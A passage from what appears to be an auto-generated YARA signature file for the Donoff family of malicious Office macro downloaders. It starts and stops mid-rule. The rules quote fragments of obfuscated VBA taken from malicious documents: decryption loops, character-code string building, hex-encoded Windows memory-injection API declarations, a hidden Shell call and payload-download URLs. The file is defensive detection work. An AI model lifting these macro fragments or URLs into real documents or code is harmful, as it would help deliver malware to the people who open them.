        $x_1_4 = "YX5BbR795IS = YX5BbR795IS & K67YzvYoIn(\"lUEADJVBAASVQQD0lEEA4JRBANSUQQDIlEEAPJVBALyUQQCwlEEA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_204
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "For XUbDXGOkRLo = 0 To Len(RvXFOJylX)" ascii //weight: 1
        $x_1_2 = "NJKdbz3Ze = (NJKdbz3Ze + 1) Mod 256" ascii //weight: 1
        $x_1_3 = "YookgI9ezSqjYWX = (YookgI9ezSqjYWX + LfZp5UEqaa1JsJ(NJKdbz3Ze)) Mod 256" ascii //weight: 1
        $x_1_4 = "B8AnD2 = LfZp5UEqaa1JsJ(NJKdbz3Ze)" ascii //weight: 1
        $x_1_5 = "LfZp5UEqaa1JsJ(NJKdbz3Ze) = LfZp5UEqaa1JsJ(YookgI9ezSqjYWX)" ascii //weight: 1
        $x_1_6 = "LfZp5UEqaa1JsJ(YookgI9ezSqjYWX) = B8AnD2" ascii //weight: 1
        $x_1_7 = "G6Hj6pIKfev(XUbDXGOkRLo) = G6Hj6pIKfev(XUbDXGOkRLo) Xor (LfZp5UEqaa1JsJ((LfZp5UEqaa1JsJ(NJKdbz3Ze) + LfZp5UEqaa1JsJ(YookgI9ezSqjYWX)) Mod 256))" ascii //weight: 1
        $x_1_8 = "Next XUbDXGOkRLo" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_205
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Chr(105) & \"l\" & Chr(99) & \"a\" & \"s\" & \"a\" & Chr(108) & Chr(101) & Chr(112) & Chr(105) & \"c\" & Chr(97) & \".\" & Chr(105) & Chr(116) & Chr(47) & Chr(52) & Chr(53) & \"g\" & Chr(51) & Chr(51)" ascii //weight: 1
        $x_1_2 = "Chr(47) & Chr(51) & Chr(52) & Chr(116) & \"2\" & Chr(100) & Chr(51) & Chr(46) & \"e\" & Chr(120) & Chr(101)" ascii //weight: 1
        $x_1_3 = "Chr(65) & \"<\" & \"d\" & Chr(111) & Chr(59) & Chr(100) & Chr(98) & Chr(61) & Chr(46) & Chr(83) & Chr(116) & Chr(61) & Chr(114) & Chr(60) & Chr(101) & \"a\" & Chr(59) & Chr(109)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_206
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "hXtu0t0psX:f/0/XwuwKw6.fmkKax6m6i0nuKd6.c7kom0/07enkX/lufoXcakftek0-m0fy-kiufp-Ka0dkdKfreXuss0" ascii //weight: 1
        $x_1_2 = "hFHttzpDsD:q/F/FwkwHwBV.mHaRxFmzikDndv.kBcoFmz/FeDnkq/VlkozcabDteH-DmRkyk-izVpV-RadbDdBrVesvsq" ascii //weight: 1
        $x_1_3 = "hRtrqtqpsk:Y/4/44ww4qw.MMmMaxSqm7iRnMd.kcRMoqm/RgqeMkoi4Sp/Yvr2RT.1rq/7ciqTtSyT/4meT" ascii //weight: 1
        $x_1_4 = "XhtktkDpsK:KI/K/wDwVKwI.mIIaxkXmkiGndD.GGcoKmK/GKgeGGoiIDpD/kvD2.I1V/VkciXtGyk/KGmVe" ascii //weight: 1
        $x_1_5 = "hLYt7tpIk:E/u/fkiuEnEisIkhlY7iInuedI7eLt7r7oiktku.IcokmQE/cuaQEtaQQlQogu/kIofQIfiu7ce7Y1E4u.QdIatI" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_207
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "16"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ashur = cramp.currente.ControlTipText" ascii //weight: 1
        $x_1_2 = "opiate = acknowledgment.apollo(ashur)" ascii //weight: 1
        $x_1_3 = "= ThisDocument.Path" ascii //weight: 1
        $x_1_4 = "& \"/\" & ThisDocument.Name" ascii //weight: 1
        $x_1_5 = "For comparable = 0 To kitchenette" ascii //weight: 1
        $x_1_6 = "Select Case comparable" ascii //weight: 1
        $x_1_7 = "Case 65 To 90" ascii //weight: 1
        $x_1_8 = "snuffcolored(comparable) = comparable - 65" ascii //weight: 1
        $x_1_9 = "Case 97 To miseria" ascii //weight: 1
        $x_1_10 = "snuffcolored(comparable) = comparable - 71" ascii //weight: 1
        $x_1_11 = "Case 48 To 57" ascii //weight: 1
        $x_1_12 = "snuffcolored(comparable) = comparable + 4" ascii //weight: 1
        $x_1_13 = "Case 43" ascii //weight: 1
        $x_1_14 = "snuffcolored(comparable) = 62" ascii //weight: 1
        $x_1_15 = "Case 47" ascii //weight: 1
        $x_1_16 = "snuffcolored(comparable) = 63" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_208
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= StrReverse(Chr$(116) & Chr$(116) & Chr$(104))" ascii //weight: 1
        $x_1_2 = "= StrReverse(Chr$(100) & Chr$(97) & Chr$(111) & Chr$(108) & Chr$(110) & Chr$(119) & Chr$(111) & Chr$(100) & Chr$(47) & Chr$(109) & Chr$(111) & Chr$(99) & Chr$(46) & Chr$(110) & Chr$(105) & Chr$(98) & Chr$(101) & Chr$(116) & Chr$(115) & Chr$(97))" ascii //weight: 1
        $x_1_3 = "+ StrReverse(Chr$(65) & Chr$(54) & Chr$(51) & Chr$(100) & Chr$(82) & Chr$(102) & Chr$(115) & Chr$(81) & Chr$(61) & Chr$(105) & Chr$(63) & Chr$(112) & Chr$(104) & Chr$(112) & Chr$(46))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_209
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "For Q3TqHyMT = 0 To UBound(BmdZVwbYOQ4NO)" ascii //weight: 1
        $x_1_2 = "If Xl115L8Dz8l8suHEp > LLpgAiXMGqsO6do Then Xl115L8Dz8l8suHEp = 0" ascii //weight: 1
        $x_1_3 = "If V6JBcwmo > 285 And VuauuoWa = False Then V6JBcwmo = 0: VuauuoWa = Not (VuauuoWa)" ascii //weight: 1
        $x_1_4 = "If V6JBcwmo > 285 And VuauuoWa = True Then V6JBcwmo = 5: VuauuoWa = Not (VuauuoWa)" ascii //weight: 1
        $x_1_5 = "BmdZVwbYOQ4NO(Q3TqHyMT) = (BmdZVwbYOQ4NO(Q3TqHyMT) Xor (YIYP8ajOTfkft(V6JBcwmo) Xor RXSYCtiR(Xl115L8Dz8l8suHEp)))" ascii //weight: 1
        $x_1_6 = "Xl115L8Dz8l8suHEp = Xl115L8Dz8l8suHEp + 1" ascii //weight: 1
        $x_1_7 = "V6JBcwmo = V6JBcwmo + 1" ascii //weight: 1
        $x_1_8 = "Next Q3TqHyMT" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_210
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {20 22 37 32 36 ?? ?? 37 32 35 ?? ?? 36 37 32 ?? ?? 36 38 31 ?? ?? 37 32 33 ?? ?? 37 32 32 ?? ?? 36 37 36 ?? ?? 37 32 32 ?? ?? 36 37 35 ?? ?? 36 37 34 ?? ?? 36 38 30 ?? ?? 36 38 30 ?? ?? 36 38 31 ?? ?? 37 32 33 ?? ?? 37 32 35 ?? ?? 36 37 39 ?? ?? 36 38 31 ?? ?? 37 32 36 ?? ?? 37 32 33 ?? ?? 36 37 36 ?? ?? 36 37 36 ?? ?? 37 32 33 ?? ?? 36 37 39 ?? ?? 36 38 31 ?? ?? 37 32 35 ?? ?? 37 32 31 ?? ?? 37 32 35 ?? ?? 36}  //weight: 1, accuracy: Low
        $x_1_2 = {20 22 38 30 66 41 36 37 33 ?? ?? 36 37 38 51 28 37 32 33 ?? ?? 37 33 33 ?? ?? 37 32 34 ?? ?? 36 37 30 ?? ?? 37 32 35 ?? ?? 37 34 34 ?? ?? 37 32 35 ?? ?? 36 35 36 ?? ?? 36 37 31 ?? ?? 37 32 33 ?? ?? 36 35 36 ?? ?? 36 35 38 ?? ?? 37 32 32 ?? ?? 37 32 39 ?? ?? 37 34 30 ?? ?? 37 33 39 ?? ?? 37 32 31 ?? ?? 37 32 34 ?? ?? 37 33 33 ?? ?? 37 32 39 ?? ?? 37 33 34 ?? ?? 36 35 36 ?? ?? 36 37 31 ?? ?? 37 34 30 ?? ?? 37 33}  //weight: 1, accuracy: Low
        $x_1_3 = {26 20 22 38 66 41 37 32 31 ?? ?? 37 33 34 ?? ?? 37 33 39 ?? ?? 37 32 36 ?? ?? 37 32 35 ?? ?? 37 33 38 ?? ?? 36 35 36 ?? ?? 36 39 33 ?? ?? 37 30 30 ?? ?? 37 30 39 ?? ?? 37 30 30 ?? ?? 36 39 33 ?? ?? 37 30 36 ?? ?? 36 37 34 ?? ?? 36 37 38 ?? ?? 36 37 36 ?? ?? 36 35 36 ?? ?? 36 37 31 ?? ?? 37 32 34 ?? ?? 37 33 35 ?? ?? 37 34 33 ?? ?? 37 33 34 ?? ?? 37 33 32 ?? ?? 37 33 35 ?? ?? 37 32 31 ?? ?? 37 32 34 ?? ?? 36 35 36}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_211
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "9"
        strings_accuracy = "Low"
    strings:
        $x_6_1 = {50 75 62 6c 69 63 20 46 75 6e 63 74 69 6f 6e 20 0f 00 28 29 20 41 73 20 56 61 72 69 61 6e 74 03 00 00 20 3d 20 41 72 72 61 79 28 [0-31] 28 [0-31] 2c 20 03 00 29 2c 20 03 28 [0-31] 2c 20 03 00 29 2c 20 03 28 [0-31] 2c 20 03 00 29 2c 20 03 28 [0-31] 2c}  //weight: 6, accuracy: Low
        $x_2_2 = {43 61 6c 6c 42 79 4e 61 6d 65 28 [0-15] 2c 20 [0-31] 28 [0-47] 2c 20 03 00 29 2c 20 31 2c 20 [0-31] 28 [0-47] 2c 20 03 00 29 20 26 20 [0-15] 20 26 20 [0-31] 28 [0-47] 2c 20 03 00 29 29}  //weight: 2, accuracy: Low
        $x_2_3 = {28 42 79 56 61 6c 20 0f 00 20 41 73 20 4f 62 6a 65 63 74 2c 20 42 79 56 61 6c 20 0f 00 20 41 73 20 53 74 72 69 6e 67 2c 20 42 79 56 61 6c 20 0f 00 20 41 73 20 56 61 72 69 61 6e 74 2c 20 42 79 56 61 6c 20 0f 00 20 41 73 20 56 61 72 69 61 6e 74 [0-48] 29 [0-4] 43 61 6c 6c 42 79 4e 61 6d 65 20 00 2c 20 01 2c 20 31 2c 20 02}  //weight: 2, accuracy: Low
        $x_1_4 = "vQDkIA = 3487 + 2013 + 70 + 130 + 15 + 1" ascii //weight: 1
        $x_1_5 = {2d 20 54 68 69 73 44 6f 63 75 6d 65 6e 74 2e [0-31] 20 2d 20 [0-31] 20 2d 20 [0-31] 20 2d 20 54 68 69 73 44 6f 63 75 6d 65 6e 74 2e [0-31] 20 2d}  //weight: 1, accuracy: Low
        $x_1_6 = "AWRDIDW = 5914 / (361 - 176 - 2 - 30 - 61 - 15 - 50 - 23 - 1 - 3)" ascii //weight: 1
        $x_1_7 = "KiuEQvBDZ = 6659 / (760 - 608 - 70 - 58 - 3 - 16 - 1 - 4)" ascii //weight: 1
        $x_2_8 = {50 72 69 76 61 74 65 20 46 75 6e 63 74 69 6f 6e 20 0f 00 28 42 79 56 61 6c 20 0f 00 20 41 73 20 56 61 72 69 61 6e 74 2c 20 42 79 56 61 6c 20 0f 00 20 41 73 20 4c 6f 6e 67 29 20 41 73 20 56 61 72 69 61 6e 74}  //weight: 2, accuracy: Low
        $x_1_9 = "Err.Raise Number:=1" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_2_*) and 5 of ($x_1_*))) or
            ((3 of ($x_2_*) and 3 of ($x_1_*))) or
            ((1 of ($x_6_*) and 3 of ($x_1_*))) or
            ((1 of ($x_6_*) and 1 of ($x_2_*) and 1 of ($x_1_*))) or
            ((1 of ($x_6_*) and 2 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_2147689064_212
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 61 6c 6c 20 53 68 65 6c 6c 24 28 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 42 75 69 6c 74 49 6e 44 6f 63 75 6d 65 6e 74 50 72 6f 70 65 72 74 69 65 73 28 [0-7] 28 22 [0-10] 22 29 29 2e 56 61 6c 75 65 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
        $x_1_2 = {53 65 74 20 [0-7] 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 43 68 72 57 24 28 26 48 34 44 29 20 26 20 43 68 72 24 28 26 48 37 33 29 20 26 20 53 74 72 52 65 76 65 72 73 65 28 43 68 72 57 28 26 48 37 38 29 29 20 26 20 53 74 72 52 65 76 65 72 73 65 28 43 68 72 28 26 48 34 44 29 29 20 26 20 53 74 72 52 65 76 65 72 73 65 28 43 68 72 28 26 48 36 43 29 29 20 26 20}  //weight: 1, accuracy: Low
        $x_1_3 = {53 65 74 20 [0-7] 20 3d 20 [0-7] 2e 43 52 65 61 54 45 65 6c 65 6d 65 6e 74 28 43 68 72 57 28 26 48 34 32 29 20 26 20 43 68 72 28 26 48 34 31 29 20 26 20 43 68 72 57 28 26 48 37 33 29 20 26 20 53 74 72 52 65 76 65 72 73 65 28 43 68 72 24 28 26 48 34 35 29 29 20 26 20 53 74 72 52 65 76 65 72 73 65 28 43 68 72 24 28 26 48 33 36 29 29 20 26 20 43 68 72 28 26 48 33 34 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = ".dATAType = StrReverse(ChrW$(&H42)) & Chr$(&H69) & ChrW$(&H6E) & StrReverse(Chr(&H2E)) & StrReverse(ChrW$(&H62)) & Chr$(&H61) & Chr$(&H53) & ChrW$(&H65) & StrReverse(Chr$(&H36)) & StrReverse(Chr(&H34))" ascii //weight: 1
        $x_1_5 = {53 65 74 20 [0-7] 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 43 68 72 57 24 28 26 48 34 31 29 20 26 20 53 74 72 52 65 76 65 72 73 65 28 43 68 72 57 28 26 48 34 34 29 29 20 26 20 43 68 72 24 28 26 48 36 46 29 20 26 20 43 68 72 57 28 26 48 34 34 29 20 26 20 43 68 72 24 28 26 48 36 32 29 20 26 20 53 74 72 52 65 76 65 72 73 65 28 43 68 72 57 28 26 48 32 45 29 29 20 26 20 43 68 72 28 26 48 35 33 29 20 26 20 53 74 72 52 65 76 65 72 73 65 28 43 68 72 28 26 48 35 34 29 29 20 26 20 43 68 72 57 24 28 26 48 35 32 29 20 26 20 43 68 72 28 26 48 34 35 29 20 26 20 43 68 72 24 28 26 48 36 31 29 20 26 20 43 68 72 57 28 26 48 36 44 29 29}  //weight: 1, accuracy: Low
        $x_1_6 = ".Charset = StrReverse(Chr$(&H75)) & StrReverse(Chr$(&H53)) & ChrW$(&H2D) & StrReverse(Chr(&H61)) & StrReverse(ChrW$(&H73)) & StrReverse(Chr(&H43)) & ChrW(&H49) & StrReverse(Chr$(&H69))" ascii //weight: 1
        $x_1_7 = ".rEadtExT" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_213
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "11"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {20 3d 20 28 41 73 63 28 [0-16] 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = {70 20 3d 20 [0-16] 2e [0-16] 2e [0-16] 2e 43 6f 6e 74 72 6f 6c 54 69 70 54 65 78 74}  //weight: 1, accuracy: Low
        $x_1_3 = {50 75 62 6c 69 63 20 44 65 63 6c 61 72 65 20 53 75 62 20 [0-16] 20 4c 69 62 20 22 6e 74 64 6c 6c 22 20 41 6c 69 61 73 20 22 52 74 6c 4d 6f 76 65 4d 65 6d 6f 72 79 22 20 28 [0-16] 20 41 73 20 41 6e 79 2c 20 [0-16] 20 41 73 20 41 6e 79 2c 20 42 79 56 61 6c 20 [0-16] 20 41 73 20 4c 6f 6e 67 29}  //weight: 1, accuracy: Low
        $x_1_4 = {50 75 62 6c 69 63 20 44 65 63 6c 61 72 65 20 46 75 6e 63 74 69 6f 6e 20 [0-16] 20 4c 69 62 20 22 6b 65 72 6e 65 6c 33 32 22 20 41 6c 69 61 73 20 22 52 65 6d 6f 76 65 44 69 72 65 63 74 6f 72 79 41 22 20 28 [0-16] 20 41 73 20 4c 6f 6e 67 29}  //weight: 1, accuracy: Low
        $x_1_5 = {50 75 62 6c 69 63 20 44 65 63 6c 61 72 65 20 46 75 6e 63 74 69 6f 6e 20 [0-16] 20 4c 69 62 20 22 6b 65 72 6e 65 6c 33 32 22 20 41 6c 69 61 73 20 22 56 69 72 74 75 61 6c 41 6c 6c 6f 63 45 78 22 20 28 42 79 56 61 6c 20 70 72 6f 63 69 64 20 41 73 20 4c 6f 6e 67 2c 20 42 79 56 61 6c 20 6c 70 61 64 64 72 20 41 73 20 4c 6f 6e 67 2c 20 42 79 56 61 6c 20 64 77 53 69 7a 65 20 41 73 20 4c 6f 6e 67 2c 20 42 79 56 61 6c 20 66 6c 41 6c 6c 6f 63 61 74 69 6f 6e 54 79 70 65 20 41 73 20 4c 6f 6e 67 2c 20 42 79 56 61 6c 20 66 6c 50 72 6f 74 65 63 74 20 41 73 20 4c 6f 6e 67 29 20 41 73 20 4c 6f 6e 67}  //weight: 1, accuracy: Low
        $x_1_6 = {50 75 62 6c 69 63 20 44 65 63 6c 61 72 65 20 46 75 6e 63 74 69 6f 6e 20 [0-16] 20 4c 69 62 20 22 6b 65 72 6e 65 6c 33 32 22 20 41 6c 69 61 73 20 22 47 65 74 4d 6f 64 75 6c 65 48 61 6e 64 6c 65 22 20 28 6c 70 4d 6f 64 75 6c 65 4e 61 6d 65 20 41 73 20 4c 6f 6e 67 29}  //weight: 1, accuracy: Low
        $x_1_7 = {50 75 62 6c 69 63 20 44 65 63 6c 61 72 65 20 46 75 6e 63 74 69 6f 6e 20 [0-16] 20 4c 69 62 20 22 6b 65 72 6e 65 6c 33 32 22 20 41 6c 69 61 73 20 22 56 69 72 74 75 61 6c 50 72 6f 74 65 63 74 22 20 28 42 79 56 61 6c 20 [0-16] 20 41 73 20 4c 6f 6e 67 2c 20 42 79 56 61 6c 20 [0-16] 20 41 73 20 4c 6f 6e 67 2c 20 42 79 56 61 6c 20 [0-16] 20 41 73 20 4c 6f 6e 67 2c 20 42 79 56 61 6c 20 [0-16] 20 41 73 20 4c 6f 6e 67 29 20 41 73 20 4c 6f 6e 67}  //weight: 1, accuracy: Low
        $x_1_8 = {50 75 62 6c 69 63 20 20 44 65 63 6c 61 72 65 20 50 74 72 53 61 66 65 20 53 75 62 20 [0-16] 20 4c 69 62 20 22 6e 74 64 6c 6c 22 20 41 6c 69 61 73 20 22 52 74 6c 4d 6f 76 65 4d 65 6d 6f 72 79 22 20 28 [0-16] 20 41 73 20 41 6e 79 2c 20 [0-16] 20 41 73 20 41 6e 79 2c 20 42 79 56 61 6c 20 [0-16] 20 41 73 20 4c 6f 6e 67 50 74 72 29}  //weight: 1, accuracy: Low
        $x_1_9 = {50 75 62 6c 69 63 20 44 65 63 6c 61 72 65 20 50 74 72 53 61 66 65 20 46 75 6e 63 74 69 6f 6e 20 [0-16] 20 4c 69 62 20 22 6b 65 72 6e 65 6c 33 32 22 20 41 6c 69 61 73 20 22 52 65 6d 6f 76 65 44 69 72 65 63 74 6f 72 79 41 22 20 28 [0-16] 20 41 73 20 4c 6f 6e 67 50 74 72 29}  //weight: 1, accuracy: Low
        $x_1_10 = {50 75 62 6c 69 63 20 44 65 63 6c 61 72 65 20 50 74 72 53 61 66 65 20 46 75 6e 63 74 69 6f 6e 20 [0-16] 20 4c 69 62 20 22 6b 65 72 6e 65 6c 33 32 22 20 41 6c 69 61 73 20 22 47 65 74 4d 6f 64 75 6c 65 48 61 6e 64 6c 65 22 20 28 6c 70 4d 6f 64 75 6c 65 4e 61 6d 65 20 41 73 20 4c 6f 6e 67 50 74 72 29}  //weight: 1, accuracy: Low
        $x_1_11 = {50 75 62 6c 69 63 20 20 44 65 63 6c 61 72 65 20 50 74 72 53 61 66 65 20 46 75 6e 63 74 69 6f 6e 20 [0-16] 20 4c 69 62 20 22 6b 65 72 6e 65 6c 33 32 22 20 41 6c 69 61 73 20 22 56 69 72 74 75 61 6c 41 6c 6c 6f 63 45 78 22 20 28 42 79 56 61 6c 20 [0-16] 20 41 73 20 4c 6f 6e 67 50 74 72 2c 20 42 79 56 61 6c 20 [0-16] 20 41 73 20 4c 6f 6e 67 50 74 72 2c 20 42 79 56 61 6c 20 [0-16] 20 41 73 20 4c 6f 6e 67 50 74 72 2c 20 42 79 56 61 6c 20 [0-16] 20 41 73 20 4c 6f 6e 67 50 74 72 2c 20 42 79 56 61 6c 20 [0-16] 20 41 73 20 4c 6f 6e 67 50 74 72 29 20 41 73 20 4c 6f 6e 67 50 74 72}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_214
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "11"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "preserveVariant(Array(111, 104, 125, 110, 104, 52, 53, 103, 106, 125, 110, 60, 105, 33, 59, 116, 104, 104, 108, 38, 51," ascii //weight: 1
        $x_1_2 = "preserveVariant(Array(127, 104, 117, 106, 121, 68, 83, 126, 118, 121, 127, 104, 52, 59, 113, 111, 100, 113, 112, 46, 50," ascii //weight: 1
        $x_1_3 = "preserveVariant(Array(50, 111, 105, 126, 111, 104, 110, 52, 44, 48, 46, 53, 33, 33, 59, 81, 70, 59, 53, 103, 106, 125," ascii //weight: 1
        $x_1_4 = "preserveVariant(Array(113, 59, 53, 39, 106, 125, 110, 60, 122, 33, 114, 121, 107, 60, 93, 127, 104, 117, 106, 121, 68," ascii //weight: 1
        $x_1_5 = "preserveVariant(Array(46, 50, 121, 100, 121, 59, 39, 117, 122, 52, 122, 50, 122, 117, 112, 121, 121, 100, 117, 111, 104," ascii //weight: 1
        $x_1_6 = "preserveVariant(Array(112, 121, 52, 108, 53, 39, 125, 50, 127, 112, 115, 111, 121, 52, 53, 39, 107, 50, 110, 105, 114," ascii //weight: 1
        $x_1_7 = "preserveVariant(Array(113, 111, 111, 127, 110, 117, 108, 104, 127, 115, 114, 104, 110, 115, 112, 50, 111, 127, 110," ascii //weight: 1
        $x_1_8 = "preserveVariant(Array(118, 111, 127, 110, 117, 108, 104))" ascii //weight: 1
        $x_1_9 = "preserveVariant(Array(127, 113, 120, 60, 51, 127, 60, 108, 115, 107, 121, 110, 111, 116, 121, 112, 112, 60, 90, 115, 110," ascii //weight: 1
        $x_1_10 = "preserveVariant(Array(104, 116, 60, 33, 60, 59, 57, 104, 113, 108, 57, 64, 41, 46, 44, 41, 40, 50, 121, 100, 121, 59, 39," ascii //weight: 1
        $x_1_11 = "preserveVariant(Array(104, 110, 117, 114, 123, 52, 53, 48, 60, 56, 108, 125, 104, 116, 53, 39, 79, 104, 125, 110, 104, 49," ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_215
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "cvGQWf = DtMJQc((cvGQWf + oqAwe), Len(suXeWW))" ascii //weight: 1
        $x_1_2 = "ot/np/w.vewo.tm//pxei:iiy/d/mwc2h.m1tagcsm" ascii //weight: 1
        $x_1_3 = "chl/mxdotowymdmtcw-ir/pawineest.pdsn:em-.s//-aa" ascii //weight: 1
        $x_1_4 = ".Open NOCHulicaFONARaptekaIVAPLAPEKC(5), NOCHulicaFONARaptekaIVA4, False" ascii //weight: 1
        $x_1_5 = "NOCHulicaFONARaptekaIVA4 = NOCHulicaFONARaptekaIVA4 & DuBirMahnWeishr(apdistance)" ascii //weight: 1
        $x_1_6 = "UNDOPRYXOR NOCHulicaFONARaptekaIVAUUUKABBB, NOCHulicaFONARaptekaIVAUUUKA, \"pAZ7xyWedSq23SWpAR5vFyqo3A8TaA4Q\"" ascii //weight: 1
        $x_1_7 = "XJBCLO = XJBCLO & YQUWRB(\"35I46K34N36P48R36T39V4AX36A43B4CE36F35I4EJ32M38N51Q34S36U52W37Y35A55C36F4" ascii //weight: 1
        $x_1_8 = "=\"\"http://disk.karelia.pro/2adftYz/392.png\"\"" ascii //weight: 1
        $x_1_9 = "z.2/ua.moc.puorgwalca//:p" ascii //weight: 1
        $x_1_10 = "a(\"JIlHTrtaaojuu\", 109, 59), a(\"SEeOtr RLospMlssdPETRxc\", 180, 57)" ascii //weight: 1
        $x_1_11 = "\"e/inOpw/ct2ml/s/mGo/tdr/wmot.aBg:civiwy.hv.emp1xS\"" ascii //weight: 1
